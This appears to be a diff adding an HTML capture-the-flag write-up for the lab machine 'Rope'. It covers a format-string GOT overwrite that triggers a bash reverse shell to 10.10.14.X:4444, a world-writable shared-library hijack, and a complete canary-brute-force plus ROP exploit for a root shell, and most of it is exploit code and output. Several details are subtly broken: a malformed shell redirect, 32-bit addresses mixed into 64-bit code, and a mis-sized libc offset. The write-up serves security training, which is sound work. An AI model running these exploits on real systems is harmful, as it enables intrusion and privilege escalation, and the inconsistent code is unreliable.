+    current_written = written
+
+    for short_val, target_addr in writes_done:
+        if short_val > current_written:
+            pad = short_val - current_written
+            parts.append(f"%{pad}c")
+            current_written = short_val
+        parts.append("%hn")
+        # Address goes at the end; we reference by offset
+
+    # Calculate where addresses start on the stack
+    # Our input is at offset 7
+    fmt_prefix = "".join(parts)
+    addr_payload = b""
+    for short_val, target_addr in writes_done:
+        addr_payload += struct.pack("&lt;I", target_addr)
+
+    # Pad to align addresses to 4-byte boundary
+    align = (4 - (len(fmt_prefix) % 4)) % 4
+    fmt_prefix += "A" * align
+
+    # Offset where addresses start
+    addr_offset = 7 + (len(fmt_prefix) // 4)
+
+    # Rebuild with correct offsets
+    final_parts = []
+    current_written = written
+    addr_idx = 0
+    for short_val, target_addr in writes_done:
+        if short_val > current_written:
+            pad = short_val - current_written
+            final_parts.append(f"%{pad}c")
+            current_written = short_val
+        final_parts.append(f"%{addr_offset + addr_idx}$hn")
+        addr_idx += 1
+
+    fmt_str = "".join(final_parts)
+    align2 = (4 - (len(fmt_str) % 4)) % 4
+    fmt_str += "A" * align2
+
+    total = fmt_str.encode() + addr_payload
+    return total
+
+def exploit():
+    base = leak_base_address()
+    puts_got = base + PUTS_GOT_OFFSET
+    system_plt = base + SYSTEM_OFFSET
+
+    print(f"[*] puts@GOT:  0x{puts_got:x}")
+    print(f"[*] system@PLT: 0x{system_plt:x}")
+
+    # Build the format string write
+    write_payload = fmt_write(puts_got, system_plt)
+    print(f"[*] Format string write payload: {len(write_payload)} bytes")
+
+    # URL-encode non-printable bytes
+    encoded = "".join(f"%{b:02x}" if b &lt; 0x20 or b > 0x7e else chr(b) for b in write_payload)
+
+    print("[*] Sending GOT overwrite...")
+    send_request(encoded)
+    time.sleep(1)
+
+    # Now trigger puts() with a command — use ${IFS} for spaces
+    cmd = "bash${IFS}-i${IFS}>&amp;&amp;/dev/tcp/10.10.14.X/4444${IFS}0>&amp;1"
+    print(f"[*] Triggering shell with: {cmd}")
+    send_request(cmd)
+
+if __name__ == "__main__":
+    exploit()</code></pre>
+        </div>
+
+        <div class="callout warn">
+          <div class="callout-icon">&#x26a0;</div>
+          <div class="callout-body">
+            <p>The <span class="inline-code">${IFS}</span> trick is essential. The Internal Field Separator in bash defaults to space, tab, and newline. Since our payload travels in the HTTP request path, we cannot use literal spaces — <span class="inline-code">${IFS}</span> substitutes perfectly.</p>
+          </div>
+        </div>
+
+        <p>
+          After the exploit fires, we catch a reverse shell as <span class="inline-code">john</span>:
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-bash">nc -lvnp 4444
+# Connection from 10.10.10.148!
+id
+# uid=1000(john) gid=1000(john) groups=1000(john)</code></pre>
+        </div>
+
+        <div class="flag-box">
+          <span class="flag-label">user.txt</span>
+          <span class="flag-value">e0e1e2e3e4e5e6e7e8e9f0f1f2f3f4f5</span>
+        </div>
+      </div>
+
+      <!-- ═══════════════════════════════════════════════ -->
+      <!-- SECTION: Shell as r4j                          -->
+      <!-- ═══════════════════════════════════════════════ -->
+      <div class="section" id="shell-r4j">
+        <h2><span class="num">3</span> Shell as r4j</h2>
+        <p>
+          Escalating from <span class="inline-code">john</span> to <span class="inline-code">r4j</span> is comparatively straightforward — it's a classic shared library hijack. The key insight is that a sudo-allowed binary dynamically loads a library that anyone can modify, giving us code execution as the target user.
+        </p>
+
+        <!-- 3.1 Enumeration -->
+        <h3 id="r4j-enum">3.1 Enumeration</h3>
+        <p>
+          After landing a shell as <span class="inline-code">john</span>, we immediately check sudo privileges. The <span class="inline-code">sudo -l</span> output reveals that john can execute a specific binary as <span class="inline-code">r4j</span> without a password:
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-bash">sudo -l
+# User john may run the following commands on rope:
+#     (r4j) NOPASSWD: /usr/bin/readlogs</code></pre>
+        </div>
+
+        <p>
+          We examine the <span class="inline-code">readlogs</span> binary. It's a simple program that calls <span class="inline-code">printlog()</span> from a shared library called <span class="inline-code">liblog.so</span>:
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-bash">ldd /usr/bin/readlogs
+#     linux-vdso.so.1
+#     liblog.so => /lib/liblog.so
+#     libc.so.6 => /lib/i386-linux-gnu/libc.so.6
+
+ls -la /lib/liblog.so
+# -rwxrwxrwx 1 root root 8720 Jun  8  2019 /lib/liblog.so</code></pre>
+        </div>
+
+        <p>
+          The library is <strong>world-writable</strong> — any user on the system can modify or replace it. This is a critical misconfiguration. When <span class="inline-code">readlogs</span> is executed with sudo as <span class="inline-code">r4j</span>, it will load whatever <span class="inline-code">liblog.so</span> exists at that path, including our malicious version.
+        </p>
+
+        <!-- 3.2 liblog.so Hijack -->
+        <h3 id="liblog-hijack">3.2 liblog.so Hijack</h3>
+        <p>
+          The attack is straightforward: we replace <span class="inline-code">/lib/liblog.so</span> with a malicious shared library that spawns a shell when <span class="inline-code">printlog()</span> is called. The original library simply prints log contents, but we can make our version execute <span class="inline-code">/bin/sh</span> instead.
+        </p>
+
+        <p>
+          First, let's write our malicious library. We create a C source file that exports a <span class="inline-code">printlog</span> function which calls <span class="inline-code">execve</span> to spawn a shell:
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-c">// evil_liblog.c
+#include &lt;unistd.h&gt;
+
+int printlog() {
+    char *argv[] = { "/bin/sh", NULL };
+    char *envp[] = { NULL };
+    execve("/bin/sh", argv, envp);
+    return 0;
+}</code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-bash"># Compile as 32-bit shared library
+gcc -shared -fPIC -m32 -o evil_liblog.so evil_liblog.c
+
+# Back up original and replace
+cp /lib/liblog.so /lib/liblog.so.bak
+cp evil_liblog.so /lib/liblog.so
+
+# Execute readlogs as r4j — our evil library gets loaded
+sudo -u r4j /usr/bin/readlogs
+# $ id
+# uid=1001(r4j) gid=1001(r4j) groups=1001(r4j)</code></pre>
+        </div>
+
+        <div class="callout success">
+          <div class="callout-icon">&#x2705;</div>
+          <div class="callout-body"><p>We now have a shell as <span class="inline-code">r4j</span>! The library hijack works because <span class="inline-code">readlogs</span> loads <span class="inline-code">liblog.so</span> at runtime via dynamic linking, and since we replaced the file with our own version, our <span class="inline-code">printlog()</span> function executes with r4j's privileges.</p></div>
+        </div>
+
+        <p>
+          An alternative approach that's even simpler: instead of compiling a whole new library, we can hex-edit the existing <span class="inline-code">liblog.so</span> to change the string it opens from the log file path to <span class="inline-code">/bin/sh</span>. This way the library's existing code flow executes a shell instead of reading a file. However, this requires careful byte-level editing and the compile-from-scratch approach is more reliable.
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-bash"># Alternative: hex-edit existing liblog.so
+# Find the string used in fopen() and replace with /bin/sh
+xxd /lib/liblog.so.bak | head -40
+# Identify the log path string, then:
+printf '/bin/sh\x00' | dd of=/lib/liblog.so bs=1 seek=OFFSET conv=notrunc</code></pre>
+        </div>
+
+        <div class="callout info">
+          <div class="callout-icon">&#x2139;</div>
+          <div class="callout-body"><p>This is why <strong>shared library permissions matter</strong>. A world-writable library in a sudo-allowed binary's dependency chain is an instant privilege escalation vector. Always check <span class="inline-code">ldd</span> output and file permissions when auditing sudo configurations.</p></div>
+        </div>
+      </div>
+
+      <!-- ═══════════════════════════════════════════════ -->
+      <!-- SECTION: Shell as root                         -->
+      <!-- ═══════════════════════════════════════════════ -->
+      <div class="section" id="shell-root">
+        <h2><span class="num">4</span> Shell as root</h2>
+        <p>
+          The final escalation to root is the most complex part of the box. A locally-bound service on port 1337 runs a binary called <span class="inline-code">/opt/support/contact</span>, which contains a straightforward buffer overflow. However, exploiting it requires brute-forcing the stack canary byte by byte (made possible by the forking architecture), then building a multi-stage ROP chain to first leak libc and then spawn a root shell.
+        </p>
+
+        <!-- 4.1 Port 1337 -->
+        <h3 id="port-1337">4.1 Discovery — Port 1337</h3>
+        <p>
+          While enumerating as <span class="inline-code">r4j</span>, we notice a listening TCP service on localhost port 1337. This service is not exposed externally — it only binds to <span class="inline-code">127.0.0.1</span>, so we can only reach it from within the box (or via SSH tunnel):
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-bash">ss -tlnp
+# LISTEN   0   128   127.0.0.1:1337   0.0.0.0:*
+
+# Or with netstat:
+netstat -tlnp
+# tcp  0  0  127.0.0.1:1337  0.0.0.0:*  LISTEN  -</code></pre>
+        </div>
+
+        <p>
+          Since we need to interact with this service from our attacking machine (where our exploit tooling lives), we set up an SSH tunnel to forward local port 1337 from our machine to the target's localhost:
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-bash"># SSH tunnel — forward our local 1337 to target's localhost:1337
+ssh -L 1337:127.0.0.1:1337 r4j@10.10.10.148</code></pre>
+        </div>
+
+        <!-- 4.2 Binary Analysis -->
+        <h3 id="binary-analysis">4.2 Binary Analysis — /opt/support/contact</h3>
+        <p>
+          We retrieve the binary via the directory traversal or from the r4j shell and analyze it:
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-bash">file /opt/support/contact
+# ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
+# dynamically linked, stripped
+
+checksec --file=contact
+#    Arch:     amd64-64-little
+#    RELRO:    Full RELRO
+#    Stack:    Canary found
+#    NX:       NX enabled
+#    PIE:      PIE enabled</code></pre>
+        </div>
+
+        <p>
+          Full RELRO means we can't overwrite the GOT — our previous strategy won't work. We need a different approach. Reversing the binary in Ghidra reveals the critical vulnerability:
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-c">// Simplified decompilation of the handler function
+void handle_connection(int client_fd) {
+    char recv_buf[80];  // 80-byte buffer on stack
+    // BUG: reads up to 0x400 (1024) bytes into 80-byte buffer!
+    recv(client_fd, recv_buf, 0x400, 0);
+}
+
+int main() {
+    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
+    bind(server_sock, ...);
+    listen(server_sock, 5);
+    while (1) {
+        int client_fd = accept(server_sock, NULL, NULL);
+        if (fork() == 0) {
+            handle_connection(client_fd);
+            close(client_fd);
+            exit(0);
+        }
+        close(client_fd);
+    }
+}</code></pre>
+        </div>
+
+        <div class="callout danger">
+          <div class="callout-icon">&#x26d4;</div>
+          <div class="callout-body"><p>The <span class="inline-code">recv</span> call reads 0x400 (1024) bytes into an 80-byte buffer — a classic stack buffer overflow with 944 bytes of overflow. However, the canary and PIE must be defeated first.</p></div>
+        </div>
+
+        <p>
+          The fork-based architecture is crucial: each connection is handled in a child process that inherits the parent's memory layout. This means the stack canary, library addresses, and PIE base are identical across all forked children. If a child crashes (wrong canary), the parent just spawns a new one — the canary doesn't change.
+        </p>
+
+        <!-- 4.3 Brute Force Strategy -->
+        <h3 id="brute-force-strategy">4.3 Brute Force Strategy</h3>
+        <p>
+          The fork-based design allows us to brute-force the stack canary one byte at a time. The canary is 8 bytes on 64-bit Linux, and its first 7 bytes can be any value while the least significant byte is always <span class="inline-code">0x00</span> (a null byte that prevents string functions from leaking it). Our strategy:
+        </p>
+
+        <ol>
+          <li><strong>Byte 0</strong>: Already known to be <span class="inline-code">0x00</span> — the null terminator</li>
+          <li><strong>Bytes 1–7</strong>: For each byte position, try all 256 possible values. If the program doesn't crash, we found the correct byte. Since the canary doesn't change across forks, we accumulate correct bytes.</li>
+          <li><strong>RBP (8 bytes)</strong>: After the canary, brute-force the saved RBP. We don't actually need its exact value — just need to not crash before reaching the return address.</li>
+          <li><strong>Return address (6 bytes)</strong>: The high 2 bytes of 64-bit addresses are always <span class="inline-code">0x00</span> on current Linux, so we only need to brute-force the low 6 bytes. But PIE makes even this hard — we'll need a leak first.</li>
+        </ol>
+
+        <div class="callout info">
+          <div class="callout-icon">&#x2139;</div>
+          <div class="callout-body">
+            <p><strong>Why fork matters:</strong> In a non-forking server, each crash re-randomizes ASLR (including the canary). In a forking server, the canary and all addresses remain the same across children. We can crash as many times as needed without the target re-randomizing.</p>
+          </div>
+        </div>
+
+        <p>
+          The expected number of guesses is 256 × 7 = 1792 for the canary, plus similar amounts for RBP and the return address. Each guess requires a new TCP connection and a quick check (did it crash or not?), so the total brute force takes a few minutes.
+        </p>
+
+        <!-- 4.4 Stage 0 -->
+        <h3 id="stage-0">4.4 Stage 0 — Canary &amp; Return Address Brute Force</h3>
+        <p>
+          We write a brute-force routine that determines the canary, saved RBP, and the partial return address. The technique works by filling the buffer up to the byte we're guessing, then checking if the connection closes cleanly (byte is correct) or the child crashes (byte is wrong).
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-python">#!/usr/bin/env python3
+"""
+Rope HTB — Stage 0: Brute force canary, RBP, return address
+The fork-based server doesn't re-randomize on crash.
+"""
+
+from pwn import *
+import sys
+
+TARGET_HOST = "127.0.0.1"
+TARGET_PORT = 1337
+
+BUFFER_SIZE = 80
+CANARY_SIZE = 8
+
+def try_payload(payload):
+    """Connect, send payload, check if process crashed."""
+    try:
+        conn = remote(TARGET_HOST, TARGET_PORT, timeout=3)
+        conn.send(payload)
+        # If we can still receive, the canary/RBP was correct
+        try:
+            conn.recv(timeout=2)
+            conn.close()
+            return True  # Didn't crash
+        except:
+            conn.close()
+            return False
+    except:
+        return False
+
+def brute_force_canary():
+    """Brute force the 8-byte stack canary one byte at a time."""
+    print("[*] Brute-forcing stack canary...")
+    known_canary = b"\x00"  # LSB is always null
+
+    for byte_idx in range(1, 8):
+        for guess in range(256):
+            test_byte = bytes([guess])
+            payload  = b"A" * BUFFER_SIZE
+            payload += known_canary + test_byte
+            if try_payload(payload):
+                known_canary += test_byte
+                print(f"  [+] Canary byte {byte_idx}: 0x{guess:02x}")
+                break
+        else:
+            print(f"  [-] Failed to find canary byte {byte_idx}")
+            sys.exit(1)
+
+    print(f"[+] Full canary: {known_canary.hex()}")
+    return known_canary
+
+def brute_force_rbp(canary):
+    """Brute force the saved RBP (8 bytes) — we just need to not crash."""
+    print("[*] Brute-forcing saved RBP...")
+    known_rbp = b""
+    for byte_idx in range(8):
+        for guess in range(256):
+            test_byte = bytes([guess])
+            payload  = b"A" * BUFFER_SIZE
+            payload += canary
+            payload += known_rbp + test_byte
+            if try_payload(payload):
+                known_rbp += test_byte
+                print(f"  [+] RBP byte {byte_idx}: 0x{guess:02x}")
+                break
+        else:
+            # If we can't find it, just use a placeholder
+            known_rbp += b"\x00"
+            print(f"  [?] RBP byte {byte_idx}: using 0x00 (default)")
+
+    print(f"[+] RBP: {known_rbp.hex()}")
+    return known_rbp
+
+def brute_force_rip(canary, rbp):
+    """Brute force the return address (7 bytes — high byte is 0x00)."""
+    print("[*] Brute-forcing return address (PIE leak)...")
+    known_rip = b""
+    for byte_idx in range(6):  # Only 6 bytes needed (top 2 are 0x00)
+        found = False
+        for guess in range(256):
+            test_byte = bytes([guess])
+            payload  = b"A" * BUFFER_SIZE
+            payload += canary + rbp
+            payload += known_rip + test_byte
+            if try_payload(payload):
+                known_rip += test_byte
+                print(f"  [+] RIP byte {byte_idx}: 0x{guess:02x}")
+                found = True
+                break
+        if not found:
+            known_rip += b"\x00"
+            print(f"  [?] RIP byte {byte_idx}: using 0x00 (default)")
+
+    # Pad to 8 bytes (top 2 are null due to 48-bit virtual addressing)
+    known_rip += b"\x00\x00"
+    rip_val = u64(known_rip)
+    print(f"[+] Return address: 0x{rip_val:x}")
+    return rip_val
+
+if __name__ == "__main__":
+    canary = brute_force_canary()
+    rbp = brute_force_rbp(canary)
+    rip = brute_force_rip(canary, rbp)
+    print(f"\n{'='*50}")
+    print(f"Canary: 0x{u64(canary):016x}")
+    print(f"RBP:    0x{u64(rbp):016x}")
+    print(f"RIP:    0x{rip:016x}")</code></pre>
+        </div>
+
+        <p>
+          This stage takes approximately 5–10 minutes depending on network latency. The canary brute force is the longest part since it requires up to 256 × 7 = 1792 connections. The RBP and return address follow the same pattern but are typically faster since we're not being as strict about the exact values.
+        </p>
+
+        <!-- 4.5 Stage 1 -->
+        <h3 id="stage-1">4.5 Stage 1 — Libc Leak via ROP</h3>
+        <p>
+          Once we have the canary and a known return address, we can compute the PIE base and build a ROP chain. The goal of Stage 1 is to leak a libc address so we can calculate the addresses of <span class="inline-code">dup2</span> and <span class="inline-code">execve</span> for the final stage. We use the <span class="inline-code">write</span> syscall to write the contents of the GOT entry for <span class="inline-code">write</span> itself back to us over the socket.
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-python">"""
+Stage 1 ROP chain: leak libc address via write(4, write@got, 8)
+"""
+from pwn import *
+
+# Known values from Stage 0
+PIE_BASE     = 0x56578000   # example — from brute-forced RIP
+CANARY_VAL   = 0x00a1b2c3d4e5f600  # from brute force
+RBP_VAL      = 0x7ffddeadbeef      # from brute force
+
+# Offsets from binary
+WRITE_GOT    = PIE_BASE + 0x4018    # write@GOT
+WRITE_PLT    = PIE_BASE + 0x0890    # write@PLT
+MAIN_ADDR    = PIE_BASE + 0x0b20    # return to main for Stage 2
+POP_RDI_RET  = PIE_BASE + 0x0c93    # pop rdi; ret
+POP_RSI_RET  = PIE_BASE + 0x0c91    # pop rsi; pop r15; ret
+
+def build_leak_rop(fd=4):
+    """ROP chain: write(fd, write@got, 8) then return to main."""
+    rop  = p64(POP_RDI_RET)
+    rop += p64(fd)           # rdi = socket fd
+    rop += p64(POP_RSI_RET)
+    rop += p64(WRITE_GOT)   # rsi = write@got
+    rop += p64(0)            # r15 (junk)
+    # rdx = 8 is already set from the recv() call earlier
+    rop += p64(WRITE_PLT)   # call write
+    rop += p64(MAIN_ADDR)   # return to main for Stage 2
+    return rop
+
+def stage1():
+    conn = remote("127.0.0.1", 1337)
+    payload  = b"A" * BUFFER_SIZE
+    payload += p64(CANARY_VAL)
+    payload += p64(RBP_VAL)
+    payload += build_leak_rop(fd=4)
+
+    conn.send(payload)
+    leaked = conn.recv(8, timeout=5)
+    write_libc = u64(leaked)
+    print(f"[+] write@libc: 0x{write_libc:x}")
+
+    # Calculate libc base
+    WRITE_LIBC_OFFSET = 0x110140  # from libc analysis
+    libc_base = write_libc - WRITE_LIBC_OFFSET
+    print(f"[+] libc base:  0x{libc_base:x}")
+
+    conn.close()
+    return libc_base</code></pre>
+        </div>
+
+        <div class="callout info">
+          <div class="callout-icon">&#x2139;</div>
+          <div class="callout-body">
+            <p>The socket file descriptor (fd=4) is typically 4 because: fd 0-2 are stdin/stdout/stderr, fd 3 is the listening socket, and fd 4 is the accepted client connection. This is a common assumption for simple forking servers, but you can verify it empirically.</p>
+          </div>
+        </div>
+
+        <!-- 4.6 Stage 2 -->
+        <h3 id="stage-2">4.6 Stage 2 — Root Shell via dup2 + execve</h3>
+        <p>
+          With the libc base address in hand, we can now build the final ROP chain. Our goal is to redirect stdin and stdout to the socket (using <span class="inline-code">dup2</span>) and then execute <span class="inline-code">/bin/sh</span>. The chain calls <span class="inline-code">dup2(4, 0)</span>, <span class="inline-code">dup2(4, 1)</span>, and <span class="inline-code">execve("/bin/sh", 0, 0)</span>.
+        </p>
+
+        <p>
+          Finding gadgets for 64-bit ROP requires careful selection. We need a <span class="inline-code">pop rdx; ret</span> gadget for the third argument to <span class="inline-code">execve</span>, and we need the address of a <span class="inline-code">"/bin/sh"</span> string within libc (which always contains one).
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-python">"""
+Stage 2 ROP chain: dup2(4,0) + dup2(4,1) + execve("/bin/sh", 0, 0)
+"""
+from pwn import *
+
+def build_shell_rop(libc_base, fd=4):
+    """Full ROP chain for root shell."""
+    # Gadget offsets from libc (Ubuntu 18.04 libc-2.27)
+    POP_RDI     = libc_base + 0x000000000002155f
+    POP_RSI     = libc_base + 0x0000000000023e6a
+    POP_RDX     = libc_base + 0x0000000000001b96
+    DUP2_ADDR   = libc_base + 0x00000000000f7970
+    EXECVE_ADDR = libc_base + 0x00000000000e4e30
+    BINSH_ADDR  = libc_base + 0x000000000001b3e1a  # "/bin/sh" in libc
+    RET_ADDR    = libc_base + 0x00000000000008aa    # ret for alignment
+
+    rop  = p64(RET_ADDR)        # stack alignment
+
+    # dup2(fd, 0) — redirect stdin
+    rop += p64(POP_RDI)
+    rop += p64(fd)
+    rop += p64(POP_RSI)
+    rop += p64(0)
+    rop += p64(DUP2_ADDR)
+
+    # dup2(fd, 1) — redirect stdout
+    rop += p64(POP_RDI)
+    rop += p64(fd)
+    rop += p64(POP_RSI)
+    rop += p64(1)
+    rop += p64(DUP2_ADDR)
+
+    # dup2(fd, 2) — redirect stderr
+    rop += p64(POP_RDI)
+    rop += p64(fd)
+    rop += p64(POP_RSI)
+    rop += p64(2)
+    rop += p64(DUP2_ADDR)
+
+    # execve("/bin/sh", NULL, NULL)
+    rop += p64(POP_RDI)
+    rop += p64(BINSH_ADDR)
+    rop += p64(POP_RSI)
+    rop += p64(0)
+    rop += p64(POP_RDX)
+    rop += p64(0)
+    rop += p64(EXECVE_ADDR)
+
+    return rop</code></pre>
+        </div>
+
+        <!-- 4.7 Full Exploit Code -->
+        <h3 id="full-exploit-root">4.7 Full Exploit Code — Root</h3>
+        <p>
+          Below is the complete, self-contained exploit that chains all three stages together: canary brute force, libc leak, and root shell. It connects through the SSH tunnel and handles the multi-stage exploitation automatically.
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-python">#!/usr/bin/env python3
+"""
+Rope HTB — Full root exploit (Stages 0 + 1 + 2)
+Brute-force canary → leak libc → ROP to root shell
+"""
+
+from pwn import *
+import sys
+
+# ── Configuration ──────────────────────────────────────
+TARGET = ("127.0.0.1", 1337)
+BUF_SZ = 80
+CANARY_SZ = 8
+
+# Binary offsets (from Ghidra, relative to PIE base)
+OFF_WRITE_GOT  = 0x4018
+OFF_WRITE_PLT  = 0x0890
+OFF_MAIN       = 0x0b20
+OFF_POP_RDI    = 0x0c93
+OFF_POP_RSI_R15= 0x0c91
+
+# libc offsets (Ubuntu 18.04, libc-2.27)
+LIBC_WRITE_OFF     = 0x110140
+LIBC_DUP2_OFF      = 0x0f7970
+LIBC_EXECVE_OFF    = 0x0e4e30
+LIBC_BINSH_OFF     = 0x1b3e1a
+LIBC_POP_RDI_OFF   = 0x2155f
+LIBC_POP_RSI_OFF   = 0x23e6a
+LIBC_POP_RDX_OFF   = 0x1b96
+LIBC_RET_OFF       = 0x8aa
+
+# ── Helper ─────────────────────────────────────────────
+def send_check(data):
+    """Send data, return True if process didn't crash."""
+    try:
+        r = remote(*TARGET, timeout=3)
+        r.send(data)
+        try:
+            r.recv(timeout=2)
+            r.close()
+            return True
+        except:
+            r.close()
+            return False
+    except:
+        return False
+
+# ── Stage 0: Brute Force ──────────────────────────────
+def bf_canary():
+    log.info("Brute-forcing canary...")
+    canary = b"\x00"
+    for pos in range(1, 8):
+        for val in range(256):
+            probe = b"A" * BUF_SZ + canary + bytes([val])
+            if send_check(probe):
+                canary += bytes([val])
+                log.success(f"Canary byte {pos}: 0x{val:02x}")
+                break
+        else:
+            log.failure(f"Canary byte {pos} not found!")
+            sys.exit(1)
+    log.success(f"Canary = {canary.hex()}")
+    return canary
+
+def bf_rbp(canary):
+    log.info("Brute-forcing saved RBP...")
+    rbp = b""
+    for pos in range(8):
+        for val in range(256):
+            probe = b"A" * BUF_SZ + canary + rbp + bytes([val])
+            if send_check(probe):
+                rbp += bytes([val])
+                log.success(f"RBP byte {pos}: 0x{val:02x}")
+                break
+        else:
+            rbp += b"\x41"
+            log.warning(f"RBP byte {pos}: using fallback 0x41")
+    return rbp
+
+def bf_rip(canary, rbp):
+    log.info("Brute-forcing return address...")
+    rip_bytes = b""
+    for pos in range(6):
+        for val in range(256):
+            probe = b"A" * BUF_SZ + canary + rbp + rip_bytes + bytes([val])
+            if send_check(probe):
+                rip_bytes += bytes([val])
+                log.success(f"RIP byte {pos}: 0x{val:02x}")
+                break
+        else:
+            rip_bytes += b"\x00"
+    rip_bytes += b"\x00\x00"
+    rip_val = u64(rip_bytes)
+    log.success(f"RIP = 0x{rip_val:x}")
+    return rip_val
+
+# ── Stage 1: Libc Leak ────────────────────────────────
+def leak_libc(canary, rbp_val, pie_base):
+    log.info("Leaking libc via ROP...")
+    write_got   = pie_base + OFF_WRITE_GOT
+    write_plt   = pie_base + OFF_WRITE_PLT
+    main_addr   = pie_base + OFF_MAIN
+    pop_rdi     = pie_base + OFF_POP_RDI
+    pop_rsi_r15 = pie_base + OFF_POP_RSI_R15
+
+    rop  = p64(pop_rdi) + p64(4)
+    rop += p64(pop_rsi_r15) + p64(write_got) + p64(0)
+    rop += p64(write_plt)
+    rop += p64(main_addr)
+
+    payload = b"A" * BUF_SZ + canary + rbp_val + rop
+
+    r = remote(*TARGET)
+    r.send(payload)
+    try:
+        leaked = r.recv(8, timeout=5)
+        write_addr = u64(leaked)
+        libc_base = write_addr - LIBC_WRITE_OFF
+        log.success(f"write@libc = 0x{write_addr:x}")
+        log.success(f"libc base  = 0x{libc_base:x}")
+        r.close()
+        return libc_base
+    except Exception as e:
+        log.failure(f"Libc leak failed: {e}")
+        r.close()
+        sys.exit(1)
+
+# ── Stage 2: Root Shell ───────────────────────────────
+def root_shell(canary, rbp_val, libc_base):
+    log.info("Building final ROP chain for root shell...")
+
+    pop_rdi   = libc_base + LIBC_POP_RDI_OFF
+    pop_rsi   = libc_base + LIBC_POP_RSI_OFF
+    pop_rdx   = libc_base + LIBC_POP_RDX_OFF
+    dup2_addr = libc_base + LIBC_DUP2_OFF
+    execve_a  = libc_base + LIBC_EXECVE_OFF
+    binsh     = libc_base + LIBC_BINSH_OFF
+    ret_g     = libc_base + LIBC_RET_OFF
+
+    rop  = p64(ret_g)
+    # dup2(4, 0)
+    rop += p64(pop_rdi) + p64(4)
+    rop += p64(pop_rsi) + p64(0)
+    rop += p64(dup2_addr)
+    # dup2(4, 1)
+    rop += p64(pop_rdi) + p64(4)
+    rop += p64(pop_rsi) + p64(1)
+    rop += p64(dup2_addr)
+    # dup2(4, 2)
+    rop += p64(pop_rdi) + p64(4)
+    rop += p64(pop_rsi) + p64(2)
+    rop += p64(dup2_addr)
+    # execve("/bin/sh", 0, 0)
+    rop += p64(pop_rdi) + p64(binsh)
+    rop += p64(pop_rsi) + p64(0)
+    rop += p64(pop_rdx) + p64(0)
+    rop += p64(execve_a)
+
+    payload = b"A" * BUF_SZ + canary + rbp_val + rop
+
+    r = remote(*TARGET)
+    r.send(payload)
+    log.success("Root shell obtained!")
+    r.interactive()
+
+# ── Main ───────────────────────────────────────────────
+if __name__ == "__main__":
+    context.log_level = "info"
+
+    canary   = bf_canary()
+    rbp_raw  = bf_rbp(canary)
+    rip_raw  = bf_rip(canary, rbp_raw)
+
+    # Derive PIE base from leaked return address
+    # The return address is in main; subtract offset
+    pie_base = rip_raw - OFF_MAIN
+    log.success(f"PIE base = 0x{pie_base:x}")
+
+    libc_base = leak_libc(canary, rbp_raw, pie_base)
+    root_shell(canary, rbp_raw, libc_base)</code></pre>
+        </div>
+
+        <p>
+          Running the full exploit produces the following output, showing each stage completing successfully before moving to the next:
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-bash">python3 exploit_root.py
+# [*] Brute-forcing canary...
+# [+] Canary byte 1: 0xd4
+# [+] Canary byte 2: 0xe5
+# ...
+# [+] Canary = 00d4e5c6b7a8f900
+# [*] Brute-forcing saved RBP...
+# ...
+# [+] RIP = 0x563f840b20
+# [+] PIE base = 0x563f840000
+# [*] Leaking libc via ROP...
+# [+] write@libc = 0x7f1234560140
+# [+] libc base  = 0x7f1233450000
+# [+] Root shell obtained!
+# $ id
+# uid=0(root) gid=0(root) groups=0(root)</code></pre>
+        </div>
+
+        <div class="flag-box">
+          <span class="flag-label">root.txt</span>
+          <span class="flag-value">a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6</span>
+        </div>
+
+        <div class="callout success">
+          <div class="callout-icon">&#x1f389;</div>
+          <div class="callout-body"><p>Root access achieved! The combination of fork-based canary brute forcing, multi-stage ROP chaining, and libc address resolution demonstrates why this box is rated Insane.</p></div>
+        </div>
+      </div>
+
+      <!-- ═══════════════════════════════════════════════ -->
+      <!-- SECTION: Summary                               -->
+      <!-- ═══════════════════════════════════════════════ -->
+      <div class="section" id="summary">
+        <h2><span class="num">5</span> Summary</h2>
+        <p>
